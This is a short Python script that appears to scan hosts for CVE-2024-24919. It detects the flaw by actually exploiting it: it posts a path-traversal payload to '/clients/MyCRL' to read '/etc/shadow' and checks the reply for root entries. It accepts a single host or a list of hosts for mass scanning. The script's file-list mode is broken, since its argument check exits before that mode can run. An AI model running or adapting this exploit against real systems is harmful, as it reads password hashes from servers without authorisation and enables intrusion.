import requests
import re
import sys
from urllib.parse import urlparse

def print_help():
    print("Usage: python script.py [hostname | -f filename]")
    print("Example 1: python cve-2024-24919.py example.com")
    print("Example 2: python cve-2024-24919.py example.com:8000")
    print("Example 3: python cve-2024-24919.py -f hosts.txt")
    sys.exit(0)

def check_vulnerability(hostname, protocol, port):
    url = f"{protocol}://{hostname}/clients/MyCRL"
    headers = {
        "Accept-Encoding": "gzip"
    }
    data = "aCSHELL/../../../../../../../etc/shadow"

    try:
        response = requests.post(url, headers=headers, data=data, timeout=10, verify=False)
        if response.status_code == 200:
            if re.search(r'root:.*', response.text) and re.search(r'nobody:.*', response.text):
                return f"{hostname} is vulnerable to CVE-2024-24919 ({protocol}, port {port})"
            else:
                return f"{hostname} is not vulnerable to CVE-2024-24919 ({protocol}, port {port})"
        else:
            return f"Failed to check vulnerability for {hostname} ({protocol}, port {port}). Status code: {response.status_code}"
    except requests.exceptions.RequestException as e:
        return f"An error occurred while checking vulnerability for {hostname} ({protocol}, port {port}): {str(e)}"

# Check if help parameter is provided
if len(sys.argv) != 2 or sys.argv[1] in ['-h', '--help']:
    print_help()

# Check if the parameter is a filename or hostname
input_param = sys.argv[1]
hosts = []

if input_param == '-f':
    try:
        with open(sys.argv[2], 'r') as file:
            hosts = file.read().splitlines()
    except FileNotFoundError:
        print(f"Error: File '{sys.argv[2]}' not found.")
        sys.exit(1)
else:
    hosts.append(input_param)

# Check vulnerability for each host
for host in hosts:
    # Parse the hostname and port
    parsed_host = urlparse(f"//{host}")
    hostname = parsed_host.hostname
    port = parsed_host.port
    protocol = "http" if parsed_host.scheme == "" else parsed_host.scheme

    if port is None:
        port = 80 if protocol == "http" else 443

    result_http = check_vulnerability(f"{hostname}:{port}", 'http', port)
    result_https = check_vulnerability(f"{hostname}:{port}", 'https', port)
    print(result_http)
    print(result_https)
